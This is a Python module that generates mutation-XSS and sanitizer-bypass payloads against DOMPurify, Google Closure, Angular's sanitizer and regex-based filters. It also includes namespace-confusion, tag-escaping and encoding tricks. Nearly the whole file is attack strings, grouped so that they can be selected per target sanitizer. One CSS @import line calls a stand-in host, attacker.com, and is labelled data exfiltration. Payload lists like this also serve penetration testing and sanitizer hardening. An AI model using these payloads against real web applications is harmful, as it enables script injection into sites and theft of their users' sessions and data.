"""
Mutation XSS (mXSS) and sanitizer bypass techniques.

mXSS exploits the difference between how browsers parse HTML
during sanitization vs. actual DOM insertion.

Includes bypasses for:
- DOMPurify
- Google Closure
- Angular sanitizer
- Custom regex-based sanitizers
"""

from dataclasses import dataclass
from typing import Iterator


@dataclass
class MutationXSS:
    """Generate mXSS and sanitizer bypass payloads."""

    def dompurify_bypasses(self) -> list[str]:
        """
        Known DOMPurify bypass payloads.

        These exploit edge cases in DOMPurify parsing.
        Note: Many are patched in newer versions.
        """
        return [
            # Namespace confusion (patched in 2.0.1)
            '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',

            # SVG + foreignObject
            '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>">',

            # noscript bypass (older versions)
            '<noscript><img src=x onerror=alert(1)></noscript>',

            # Form + formaction
            '<form><input type="submit" formaction="javascript:alert(1)">',

            # SVG animate
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',

            # Use tag with href
            '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><a xlink:href=javascript:alert(1)><rect width=100 height=100 /></a></svg>#x">',

            # Mutation during innerHTML
            '<p id="><img src=x onerror=alert(1)><"></p>',

            # Custom element mutation
            '<x-]="x"><img src=x onerror=alert(1)>',

            # SVG set element
            '<svg><set onbegin=alert(1)></svg>',

            # Math + annotation-xml
            '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',

            # template element escape
            '<template><img src=x onerror=alert(1)></template>',

            # Style data exfil (not XSS but useful)
            '<style>@import url("https://attacker.com/");</style>',

            # Newer bypass attempts
            '<svg><discard onbegin=alert(1)>',
            '<svg><handler on:event="alert(1)">',

            # mXSS via backtick in attribute
            '<img src=x onerror=alert`1`>',

            # Breaking sanitizer regex
            '<img/src="x"onerror=alert(1)>',
            '<img\nsrc=x\nonerror=alert(1)>',
            '<img\tsrc=x\tonerror=alert(1)>',
        ]

    def google_closure_bypasses(self) -> list[str]:
        """
        Google Closure sanitizer bypass payloads.
        """
        return [
            # Style-based
            '<div style="background:url(javascript:alert(1))">',
            '<div style="width:expression(alert(1))">',  # IE only

            # SVG
            '<svg onload=alert(1)>',

            # Data URI in style
            '<div style="background:url(data:text/html,<script>alert(1)</script>)">',
        ]

    def angular_sanitizer_bypasses(self) -> list[str]:
        """
        Angular DomSanitizer bypass payloads.

        Angular has bypassSecurityTrust* methods that might be misused.
        """
        return [
            # If bypassSecurityTrustHtml is used incorrectly
            '<img src=x onerror=alert(1)>',

            # Template injection if sanitizer is bypassed
            '{{constructor.constructor("alert(1)")()}}',

            # Resource URL bypass
            'javascript:alert(1)',

            # Style bypass
            '<div [innerHTML]="\'<img src=x onerror=alert(1)>\'">',
        ]

    def regex_sanitizer_bypasses(self) -> list[str]:
        """
        Bypass common regex-based sanitizers.

        These exploit regex limitations.
        """
        return [
            # Nested tags confuse regex
            '<<script>script>alert(1)</script>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',

            # Null bytes
            '<scr\x00ipt>alert(1)</script>',
            '<img src=x onerror=alert\x00(1)>',

            # Unicode escapes
            '<script>\\u0061lert(1)</script>',

            # Different quote styles
            '<img src=x onerror=`alert(1)`>',
            '<img src=x onerror=alert&lpar;1&rpar;>',

            # HTML entities in event handlers
            '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',

            # Newlines/tabs breaking regex
            '<script\n>alert(1)</script>',
            '<img\tsrc=x\tonerror=alert(1)>',

            # Case variations
            '<ScRiPt>alert(1)</ScRiPt>',
            '<IMG SRC=x ONERROR=alert(1)>',

            # Incomplete tags that browsers fix
            '<img src=x onerror=alert(1)//',
            '<img src=x onerror=alert(1) ',

            # Comments
            '<script>alert(1)//</script>',
            '<script>/**/alert(1)/**/</script>',

            # Backslash escaping
            '<img src=x onerror="alert(1)\\">',
        ]

    def mutation_payloads(self) -> list[str]:
        """
        Payloads that mutate during DOM parsing.

        The browser "fixes" malformed HTML in unexpected ways.
        """
        return [
            # Backtick mutation
            '<img src=`x`onerror=alert(1)>',

            # Missing quotes mutation
            '<img src=x onerror=alert(1)>',

            # Entity decoding mutation
            '<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>',

            # Self-closing mutation
            '<img src=x onerror=alert(1)/>',

            # Table mutation (browsers add tbody)
            '<table><img src=x onerror=alert(1)></table>',

            # Select mutation
            '<select><img src=x onerror=alert(1)></select>',

            # Math namespace mutation
            '<math><mi><img src=x onerror=alert(1)></mi></math>',

            # Svg namespace mutation
            '<svg><desc><img src=x onerror=alert(1)></desc></svg>',

            # p tag auto-closing
            '<p><img src=x onerror=alert(1)><p>',

            # Title escaping
            '</title><img src=x onerror=alert(1)>',

            # Textarea escaping
            '</textarea><img src=x onerror=alert(1)>',

            # Style escaping
            '</style><img src=x onerror=alert(1)>',

            # Script escaping
            '</script><img src=x onerror=alert(1)>',

            # Comment mutation
            '<!--><img src=x onerror=alert(1)>-->',

            # CDATA mutation
            '<![CDATA[><img src=x onerror=alert(1)>]]>',
        ]

    def encoding_mutation_payloads(self) -> list[str]:
        """
        Payloads using encoding tricks for mutation.
        """
        return [
            # UTF-7 (if charset not set)
            '+ADw-script+AD4-alert(1)+ADw-/script+AD4-',

            # UTF-16
            '\xff\xfe<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00a\x00l\x00e\x00r\x00t\x00(\x001\x00)\x00<\x00/\x00s\x00c\x00r\x00i\x00p\x00t\x00>',

            # HTML entities
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',

            # Double encoding
            '%253Cscript%253Ealert(1)%253C/script%253E',

            # Mixed encoding
            '<scr%69pt>alert(1)</script>',
            '<%73cript>alert(1)</script>',
        ]

    def generate_all(self) -> Iterator[str]:
        """Generate all mXSS and sanitizer bypass payloads."""
        yield from self.dompurify_bypasses()
        yield from self.google_closure_bypasses()
        yield from self.angular_sanitizer_bypasses()
        yield from self.regex_sanitizer_bypasses()
        yield from self.mutation_payloads()
        yield from self.encoding_mutation_payloads()

    def get_for_sanitizer(
        self,
        sanitizer: str = "unknown"
    ) -> list[str]:
        """Get targeted payloads for specific sanitizer."""

        if sanitizer.lower() == "dompurify":
            return self.dompurify_bypasses()
        elif sanitizer.lower() in ("closure", "google"):
            return self.google_closure_bypasses()
        elif sanitizer.lower() == "angular":
            return self.angular_sanitizer_bypasses()
        elif sanitizer.lower() == "regex":
            return self.regex_sanitizer_bypasses()
        else:
            # Return all for unknown sanitizer
            return list(self.generate_all())


def get_mxss_payloads(
    sanitizer: str = "unknown",
    max_payloads: int = 50
) -> list[str]:
    """Convenience function to get mXSS payloads."""
    mxss = MutationXSS()
    payloads = mxss.get_for_sanitizer(sanitizer)
    return payloads[:max_payloads]


def get_dompurify_bypasses() -> list[str]:
    """Get DOMPurify-specific bypass payloads."""
    mxss = MutationXSS()
    return mxss.dompurify_bypasses()
